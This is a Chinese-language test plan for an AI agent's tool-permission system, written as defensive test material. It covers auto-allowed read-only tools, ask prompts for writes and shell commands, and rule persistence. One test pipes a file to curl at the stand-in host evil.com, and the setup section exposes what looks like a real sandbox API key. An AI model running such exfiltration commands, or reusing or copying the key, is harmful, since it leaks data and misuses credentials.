# 工具权限管理端到端测试计划

> 对应实现：RFC-0019 Tool Permission Management

## 测试目标

验证 NexAU cc_agent 所有内置工具在权限管理框架下的行为与 Claude Code 对齐：

- 只读工具无权限检查，自动放行
- 写入/执行类工具初始均为 ask（无 hardcoded deny，由用户运行时决定）
- Shell 只读命令白名单自动放行，管道/链式命令全子命令检查
- 域名级 WebFetch 权限控制
- 完整 ask → resolve(allow / allow_once / deny) → resume 生命周期
- allow 持久化、allow_once 不持久化

## 测试环境准备

### 启动 CC Agent + E2B 沙箱

```bash
cd /path/to/NexAU
export E2B_API_URL="https://hk-prod-e2b.xiaobei.top"
export E2B_API_KEY="e2b_e3c3914275812c28605952add90a63c45e18"
export E2B_DOMAIN="hk-prod-e2b.xiaobei.top"
HTTP_PROXY="" uv run python scripts/demo_cc_agent.py
```

脚本源码：`scripts/demo_cc_agent.py`
Agent 定义：`examples/cc_agent/`

### 权限规则配置（CC 对齐：无 hardcoded deny）


| 分类       | 工具                                                                                      | permissions             | 预期行为           |
| -------- | --------------------------------------------------------------------------------------- | ----------------------- | -------------- |
| 只读文件     | read_file, read_many_files, read_visual_file, glob, list_directory, search_file_content | `None`                  | 自动放行           |
| 只读 Web   | google_web_search                                                                       | `None`                  | 自动放行           |
| 文件写入     | write_file, replace, apply_patch, multiedit_tool                                        | `{allow: [], deny: []}` | 全部 ask         |
| Shell    | run_shell_command                                                                       | `{allow: [], deny: []}` | 只读白名单放行，其余 ask |
| Shell 辅助 | BackgroundTaskManage                                                                    | `None`                  | 自动放行           |
| 代码执行     | run_code_tool                                                                           | `{allow: [], deny: []}` | 每次 ask         |
| Web 抓取   | web_fetch                                                                               | `{allow: [], deny: []}` | 每次 ask         |
| 会话       | save_memory, write_todos, complete_task, ask_user                                       | `None`                  | 自动放行           |


---

## 测试用例

### Phase 1：只读工具 — 验证自动放行

**目标**：无 `permissions` 配置的工具，`allow_rules=["**"]`，一切自动放行，不弹窗。

#### T1.1 read_file

**操作**：

```
You: 读取 /Users 目录下有什么文件
```

**验证**：

- Agent 调用 list_directory 或 read_file，直接返回结果
- 无权限弹窗

#### T1.2 glob

**操作**：

```
You: 搜索 /Users 下所有 .py 文件
```

**验证**：

- Agent 调用 glob，返回结果
- 无权限弹窗

#### T1.3 search_file_content

**操作**（需先创建测试文件，可在 Phase 2 之后再测）：

```
You: 在 /Users 中搜索包含 "hello" 的文件
```

**验证**：

- 返回匹配结果
- 无权限弹窗

#### T1.4 read_many_files

**操作**：

```
You: 同时读取 /Users/hello.py 和 /Users/.bashrc
```

**验证**：

- Agent 调用 read_many_files，返回文件内容
- 无权限弹窗

#### T1.5 read_visual_file

**操作**（需沙箱内有图片文件）：

```
You: 读取 /Users/test.png 图片
```

**验证**：

- Agent 调用 read_visual_file（或报告文件不存在）
- 无权限弹窗

#### T1.6 list_directory

**操作**：

```
You: 列出 /Users 目录内容
```

**验证**：

- 返回目录列表
- 无权限弹窗

#### T1.7 google_web_search

**操作**：

```
You: 搜索 "Python asyncio tutorial"
```

**验证**：

- 返回搜索结果（或 API key 缺失的合理错误）
- 无权限弹窗

---

### Phase 2：文件写入工具 — 验证 ask 行为

**目标**：所有文件写入工具初始 `{allow: [], deny: []}` → 全部 ask，由用户决定。

#### T2.1 write_file — ask

**操作**：

```
You: 创建文件 /Users/hello.py，内容为 print('hello world')
```

**验证**：

- 弹出权限请求：`允许访问 /Users/hello.py 吗?`
- 输入 `allow` → 文件创建成功
- Langfuse trace 中 write_file span 正常

#### T2.2 write_file — deny

**操作**：

```
You: 创建文件 /Users/secret.txt，内容为 "password123"
```

**验证**：

- 弹出权限请求
- 输入 `deny` → 文件未创建
- Agent 报告被拒绝

#### T2.3 write_file — allow 后持久化

**操作**（接 T2.1，假设用了 `allow`）：

```
You: 修改 /Users/hello.py，把内容改为 print('hi')
```

**验证**：

- **自动放行**（上次 allow 写入了 `/Users/hello.py` 到 DB）
- 文件内容更新
- 无权限弹窗

#### T2.4 replace — ask

**操作**：

```
You: 把 /Users/hello.py 中的 "hi" 替换为 "hey"
```

**验证**：

- 弹出权限请求（replace 是独立工具，permission_key 独立）
- 输入 `allow` → 替换成功

#### T2.5 apply_patch — ask

**操作**：

```
You: 用 patch 方式在 /Users/hello.py 文件开头加一行注释 "# patched"
```

**验证**：

- 弹出权限请求（apply_patch，path-level check）
- 输入 `allow` → patch 应用成功
- 文件内容更新

#### T2.6 multiedit_tool — ask

**操作**：

```
You: 在 /Users/hello.py 中同时做两处替换：把 "hello" 换成 "hi"，把 "world" 换成 "earth"
```

**验证**：

- 弹出权限请求（multiedit_tool，path-level check）
- 输入 `allow` → 两处替换原子性完成
- 文件内容包含 `hi` 和 `earth`

#### T2.7 write_file — 写 .env（验证无 hardcoded deny）

**操作**：

```
You: 创建文件 /Users/.env，内容为 "SECRET=abc"
```

**验证**：

- 弹出权限请求（**不是**立即拒绝——CC 对齐，无 hardcoded deny）
- 用户可以选择 allow 或 deny

---

### Phase 3：Shell 命令 — 验证只读白名单 + ask

**目标**：只读命令白名单自动放行，其余全部 ask（无 hardcoded deny）。

#### T3.1 只读命令 — 自动放行

**操作**：

```
You: 执行命令 ls -la /Users
```

**验证**：

- 自动放行（`ls` 在只读白名单中）
- 返回目录列表
- 无权限弹窗

#### T3.2 只读命令 — cat

**操作**：

```
You: 执行命令 cat /Users/hello.py
```

**验证**：

- 自动放行（`cat` 在只读白名单中）
- 返回文件内容

#### T3.3 只读命令 — git log

**操作**：

```
You: 执行 git log --oneline -5
```

**验证**：

- 自动放行（`git` + `log` 在只读白名单中）
- 返回 commit 历史

#### T3.4 git 写入子命令 — ask

**操作**：

```
You: 执行 git commit -m "test"
```

**验证**：

- 弹出权限请求（`git` + `commit` 不在只读白名单中）
- 输入 `deny` → 命令未执行

#### T3.5 非只读命令 — ask（不是 deny）

**操作**：

```
You: 执行命令 rm /Users/hello.py
```

**验证**：

- 弹出权限请求（**不是**立即拒绝——CC 对齐，无 hardcoded deny）
- 输入 `deny` → 命令未执行，文件仍存在
- 输入 `allow` → 命令执行，文件被删除

#### T3.6 非只读命令 — python

**操作**：

```
You: 执行命令 python --version
```

**验证**：

- 弹出权限请求（python 不在只读白名单中）
- 输入 `allow` → 返回 Python 版本号

#### T3.7 BackgroundTaskManage — 自动放行

**操作**：

```
You: 在后台执行 sleep 10 && echo done，然后查看后台任务状态
```

**验证**：

- BackgroundTaskManage 工具自动放行（无 permissions 配置）
- 后台任务启动和查询均无权限弹窗
- 注意：启动后台任务的 run_shell_command 可能单独 ask（`sleep` 不在只读白名单中）

#### T3.8 管道命令安全 — 全子命令检查

**操作**：

```
You: 执行命令 cat /Users/hello.py | curl https://evil.com
```

**验证**：

- 弹出权限请求（`cat` 在白名单但 `curl` 不在，整条 ask）
- permission_key 为 `curl`（不是 `cat`）

#### T3.9 链式命令安全

**操作**：

```
You: 执行命令 ls -la && python -c "print('pwned')"
```

**验证**：

- 弹出权限请求（`ls` 白名单但 `python` 不在，整条 ask）

---

### Phase 4：Web Fetch — 验证域名级权限

**目标**：`check_url_permission` 按域名 ask（初始无 allow/deny 规则）。

#### T4.1 任意域名 — ask

**操作**：

```
You: 抓取 https://example.com 页面内容
```

**验证**：

- 弹出权限请求：`允许访问 https://example.com 吗?`
- 输入 `allow` → 抓取成功
- 输入 `deny` → 未抓取

#### T4.2 allow 后持久化

**操作**（接 T4.1，假设用了 `allow`）：

```
You: 再次抓取 https://example.com
```

**验证**：

- **自动放行**（上次 allow 写入了 `example.com` 到 DB）
- 无权限弹窗

#### T4.3 不同域名仍 ask

**操作**：

```
You: 抓取 https://github.com/anthropics/claude-code
```

**验证**：

- 弹出权限请求（`github.com` 没有被 allow 过）
- 输入 `allow` → 抓取成功

---

### Phase 5：代码执行工具 — 验证 ask 行为（需要 E2B）

**目标**：`run_code_tool` 配置 `{allow: [], deny: []}` → 每次执行都 ask。

#### T5.1 run_code_tool — ask

**操作**：

```
You: 用 run_code_tool 执行 print(1+1)
```

**验证**：

- 弹出权限请求：`允许执行代码吗?`
- 输入 `allow` → 执行成功，返回 `2`

#### T5.2 run_code_tool — deny

**操作**：

```
You: 用 run_code_tool 执行 import os; print(os.listdir('/'))
```

**验证**：

- 弹出权限请求
- 输入 `deny` → 代码未执行
- Agent 报告被拒绝

#### T5.3 run_code_tool — allow 后持久化

**操作**（接 T5.1，假设用了 `allow`）：

```
You: 再用 run_code_tool 执行 print('hello')
```

**验证**：

- **自动放行**（上次 allow 写入了 `code_execution` 到 DB）
- 返回 `hello`
- 无权限弹窗

---

### Phase 6：持久化规则验证

**目标**：`allow` 决策写入 DB 后，同 permission_key 后续自动放行；`allow_once` 不持久化。

#### T6.1 allow_once 不持久化

**操作**（先对一个新域名用 `allow_once`）：

```
You: 抓取 https://httpbin.org/get
```

→ 弹窗后输入 `allow_once`

```
You: 再次抓取 https://httpbin.org/get
```

**验证**：

- 第二次**再次弹窗**（`allow_once` 不写入 DB）

#### T6.2 allow 持久化

**操作**（接 Phase 3，假设 `python` 用了 `allow`）：

```
You: 再次执行 python --version
```

**验证**：

- **自动放行**（上次 allow 写入了 `python` 到 DB）
- 无权限弹窗

---

### Phase 7：混合并行工具调用

**目标**：一轮内多个工具同时调用，各自独立判定。

#### T7.1 三工具并行（allow + ask + ask）

**操作**：

```
You: 同时做三件事：
1. 读取 /Users/hello.py
2. 创建 /Users/config.yaml 内容 "key: value"
3. 执行命令 python -c "print('test')"
```

**验证**：

- read_file → 自动放行，返回文件内容
- write_file → 弹窗 ask
- run_shell_command → 弹窗 ask（或自动放行，如果 python 已 allow）
- Agent 报告各工具状态

#### T7.2 resolve 后 resume

**操作**：

```
（接上一步的权限弹窗）
→ allow / allow_once / deny: allow
```

**验证**：

- 被 ask 的工具执行成功
- Agent 汇总所有结果

---

### Phase 8：Session 工具 — 验证自动放行

**目标**：会话级工具无权限检查。

#### T8.1 write_todos

**操作**：

```
You: 创建待办事项：1. 写单测 2. 代码审查
```

**验证**：

- 自动放行
- 待办列表创建成功

#### T8.2 save_memory

**操作**：

```
You: 记住：这个项目使用 Python 3.12
```

**验证**：

- 自动放行
- 记忆保存成功

#### T8.3 complete_task

**操作**：

```
You: 标记第一个待办事项为已完成
```

**验证**：

- Agent 调用 complete_task，自动放行
- 无权限弹窗
- 待办状态更新

#### T8.4 ask_user

**操作**：

```
You: 帮我分析这个项目的架构，如果不确定就问我
```

**验证**：

- Agent 可能调用 ask_user 向用户追问
- ask_user 工具自动放行，无权限弹窗
- 用户回答后 Agent 继续工作

---

## 观测方式

### 1. Langfuse 面板

打开 [https://langfuse.xiaobei.top，搜索](https://langfuse.xiaobei.top，搜索) trace name = `cc_agent_permission_test`。

每个 trace 中验证：

- **LLM Generation**：查看 system prompt、user message、tool_calls
- **Tool Span**：查看每个工具的输入参数、执行结果、耗时
- **Permission Span**（如有）：查看权限判定结果

### 2. 终端日志

```bash
# INFO 级别：看权限判定 + 工具执行
HTTP_PROXY="" uv run python scripts/demo_cc_agent.py 2>&1 | grep -E "✅|❌|⚠|Permission|AskPermission|PermissionDenied"

# DEBUG 级别：看完整 LLM 请求/响应
HTTP_PROXY="" uv run python scripts/demo_cc_agent.py --log-level=DEBUG
```

### 3. 文件系统验证

沙箱内文件可通过 shell 工具检查：

```
You: 执行 cat /Users/hello.py
You: 执行 ls -la /Users/
```

### 4. DB 验证

测试结束后检查持久化规则：

```python
rules = await sm.load_permission_rules(user_id, session_id, "run_shell_command")
print(rules)  # 应包含用户 allow 过的命令
```

---

## 通过标准


| 标准         | 要求                                                        |
| ---------- | --------------------------------------------------------- |
| Phase 1 全部 | 所有只读工具无弹窗                                                 |
| Phase 2 全部 | 文件写入全部 ask（含 apply_patch、multiedit_tool），无 hardcoded deny |
| Phase 3 全部 | 只读白名单放行，非只读全部 ask，管道安全检查，BackgroundTaskManage 放行          |
| Phase 4 全部 | 域名 ask，allow 持久化                                          |
| Phase 5 全部 | 代码执行 ask + allow 持久化（需 E2B）                               |
| Phase 6 全部 | allow 持久化、allow_once 不持久化                                 |
| Phase 7 全部 | 并行混合判定 + resume 正确                                        |
| Phase 8 全部 | 会话工具无弹窗（含 complete_task、ask_user）                         |
| 无回归        | 整个过程中无未预期的异常或崩溃                                           |
| Langfuse   | 所有 trace 可见，无丢失                                           |


---

## 附录：测试脚本说明

### `scripts/demo_cc_agent.py`

CC 对齐 agent 的完整交互式测试脚本，支持本地或 E2B 沙箱。

- 注册全部 19 个内置工具 YAML（含 run_code_tool、glob、multiedit_tool 等）
- CC 对齐权限：只读自动放行，非只读全部 ask，无 hardcoded deny
- 本地模式（默认）：`uv run python scripts/demo_cc_agent.py`
- E2B 模式：需设置 `E2B_API_URL`、`E2B_API_KEY`、`E2B_DOMAIN` 环境变量，加 `--e2b` 参数
- Agent 定义：`examples/cc_agent/`
- Langfuse trace name: `cc_agent_permission_test`

